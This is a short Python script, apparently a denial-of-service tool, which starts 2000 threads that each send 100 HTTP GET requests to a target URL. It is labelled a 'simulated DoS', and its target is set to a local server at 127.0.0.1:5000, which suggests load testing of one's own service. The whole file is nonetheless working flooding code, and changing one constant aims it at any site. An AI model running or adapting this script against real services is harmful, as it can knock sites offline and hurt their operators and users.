import requests
import threading
import time

# Target settings
TARGET_URL = "http://127.0.0.1:5000"
REQUESTS_PER_THREAD = 100
NUM_THREADS = 2000
DELAY_BETWEEN_THREADS = 0.1  # seconds


def dos_attack():
    for _ in range(REQUESTS_PER_THREAD):
        try:
            response = requests.get(TARGET_URL)
            print(f"[+] Status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[-] Error: {e}")


if __name__ == "__main__":
    print(f"Starting simulated DoS on {TARGET_URL}")
    threads = []

    for i in range(NUM_THREADS):
        thread = threading.Thread(target=dos_attack)
        thread.start()
        threads.append(thread)
        time.sleep(DELAY_BETWEEN_THREADS)

    for thread in threads:
        thread.join()

    print("DoS simulation completed.")
